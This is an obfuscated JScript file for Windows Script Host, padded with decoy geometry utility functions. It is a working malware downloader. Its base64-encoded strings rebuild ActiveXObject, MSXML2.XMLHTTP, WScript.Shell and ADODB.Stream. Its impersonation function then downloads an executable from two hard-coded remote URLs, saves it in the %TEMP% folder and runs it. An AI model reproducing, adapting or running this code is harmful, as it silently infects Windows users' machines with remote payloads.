var cooperative = 0;
bombastic = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  oracular = [];
var espouse = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
String.prototype.miserly = function () {
	rabid = this;
	for (var i in espouse){rabid = rabid.replace(i, espouse[i]);}
    return rabid;
};
  for ( var i = 128; i--; ) {
    if ( oracular[ i ] === undefined )
      oracular[ i ] = -1;
  
    oracular[ bombastic.charCodeAt( i ) ] = i;
  }
var heinous = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.miserly4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("installation").join("");
    len = str.length;
    i = 0;
    out = "";
    while(i < len) {
	do {
	    c1 = oracular[str.charCodeAt(i++) & 0xff];
	} while(i < len && c1 == -1);
	if(c1 == -1)
	    break;
	do {
	    c2 = oracular[str.charCodeAt(i++) & 0xff];
	} while(i < len && c2 == -1);
	if(c2 == -1)
	    break;

	out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

	do {
	    c3 = str.charCodeAt(i++) & 0xff;
	    if(c3 == 61)
		return out;
	    c3 = oracular[c3];
	} while(i < len && c3 == -1);
	if(c3 == -1)
	    break;

	out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

	do {
	    c4 = str.charCodeAt(i++) & 0xff;
	    if(c4 == 61)
		return out;
	    c4 = oracular[c4];
	} while(i < len && c4 == -1);
	if(c4 == -1)
	    break;
	out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}

Point.distance = function(p1, p2) {
    var a = p1.x - p2.x;
    var b = p1.y - p2.y;
    return Math.sqrt(a * a + b * b);
};
Point.dot = function(p1, p2) {
    return p1.x * p2.x + p1.y * p2.y;
};

Point.cross = function(p1, p2) {
    return p1.x * p2.y - p1.y * p2.x;
};

var idaho ="installationJVinstallationRFTVinstallationAl".miserly4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var vernal = "installationQWinstallationN0aXZinstallationlWE9iainstallationmVjdA=installation=".miserly4();
String.prototype.miserly2 = function () {
    var aberrations = {
        determination: this
    };
    aberrations.queensland = aberrations.determination["c3Vic3RyaW5n".miserly4()](cooperative, heinous);
    return aberrations.queensland;
};

var cajole ="installationRXhwYW5installationkRW52aXinstallationJvbm1lbnRTdHJinstallationpbmdz".miserly4();
var Native = function(options){
	
};
var magnolia = [vernal, cajole,idaho,  ""+"."+("forte","crude","stone","diffident","cambrian","burning","niggardly","porcupine","exe"), "UnVu".miserly4(), ("M"+"SX"+"ML"+("guidelines","jeremy","sioux","disparity","partially","aaron","murky","2.")+"|M"+"LH"+"TT"+("shambles","relationships","pistil","sulphuric","inversion","demented","widen","icelandic","P>")+"WU"+("identifying","robbie","yearly","chine","departure","months","primarily","cr")+("engrave","billiards","hardheaded","shipments","lotus","fibre","tasks","acquittal","ip")+"t:"+("windy","absent","presidential","farming","twice","matins","entitle","regime","Sh")+"ell").miserly()];
tacit = "_F2_";
var pushed = this[magnolia.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
yFKrCmmg = "VqcicBtLEq";
benediction = (("wesley", "sluice", "dysentery", "hampshire", "allows", "stylish", "indeterminate", "pFgPKvmk") + "whoKmOBEq").miserly2();
heartrending = (("terrace", "answered", "scholarships", "disrespect", "projectile", "archipelago", "undeviating", "stubbornness", "impartiality", "sbfmHaqwvUx") + "HBTzJOrPY").miserly2();
  
    String.prototype.spherical = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var asset = magnolia.pop().split(">");

saunter = "b3Blbg==".miserly4();
var demerit = new pushed(asset[1]);
qbEJDHEPsAW = "_F3_";
var embedded = new pushed(asset[0]);
var principle = demerit[magnolia.shift()](magnolia.shift());
MFWAxq = "_F5_";
weasel = (("improvement", "paddling", "graduation", "buckwheat", "EcDlcWg") + "oaqLYNFt").miserly2();

var loading = magnolia.shift();
var expenditures = magnolia.shift();
function impersonation(together, secretary) {

    try {
        var apprise = principle + "/" + secretary ;
		apprise = apprise+ loading;
            embedded[saunter](("tacking","activated","G" + weasel) + ("systematic","spoonful","arbitration","giant","T"), together, false);
       
    CajOrOK = "_F7_";
    embedded[heartrending + ("simon","lexmark","end")]();
	var inextricable=(WScript+"benediction"=="V2luZG93cyBTY3JpcHQgSG9zdA==".miserly4()+"benediction")&&embedded["c3RhdHVz".miserly4()] +""=="MjAw".miserly4()&&typeof(HXvHQE)==="undefined";
	lQHNgR = "_F8_";
    if (inextricable) {
		
        var distortion = new pushed((("chairs","quito","allegorical","accidents","allah","musty","reactionary","bedclothes","A")+("bright","lettuce","tacks","inequalities","permitted","dionysius","poniard","mixer","SEOO")+"DB"+("entitled","cleaners","newman","wyoming","dildos","thinker","stages",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        distortion[saunter]();
        WJEzqoHQk = "_F9_";
        distortion.type = heinous;
        KTYoEUX = "_F10_";
        distortion["d3JpdGU=".miserly4()](embedded[("equipped","monkey","nearly","defeat","cornet","damnable","northamptonshire","")+"R"+"es"+"pon"+espouse['U'].toLowerCase()+"e"+"Qm9keQ==".miserly4()]);
        unsqhKn = "_F11_";
        distortion[(benediction + "o"+("fulsome","kernel","decomposition","developers","maori","molecular","dedication","namibia","00")+("buttermilk","finding","weymouth","predominant","downtown","plaza","contrast","8i")+"tion").replace("0"+("dryer","brook","headed","youthfulness","bumper","opening","church","08"), heartrending)] = 0;
        htYKQwuNOoi = "_F12_";
        distortion[("alarm","tsunami","defendant","linear","producer","check","concentrate","s")+"aveT"+"oF"+"ile"](apprise, 2);
        cVUjXy = "_F13_";
        distortion.close();
        TKOccwtwq = "_F14_";
		demerit[expenditures](apprise, heinous, true);
    }
} catch (FCTlxhn) { };

    zynzlzpMRlx = "_F15_";
}
try{
impersonation("aHR0cDovLw==".miserly4()+"\u006C\u0069\u0074\u0074\u006C\u0065\u0073\u006F\u0075\u006E\u0064\u0064\u006A"+"\u002E\u0063\u006F\u006D\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?isIeshsq=oxadDjLoTDO","qyYsuzpMp");}catch(hXXanSPSq){}

impersonation("aHR0cDovLw==".miserly4()+"\u0062\u006C\u006F\u0067\u002E\u0072\u006F\u0074\u0061\u0070\u006F\u0073\u0074"+"\u002E\u0072\u0075\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?VUkbnvGpCy=HILRSJKXGdD","JpbfCVSya");
   aJvoWfX = "_F16_";
   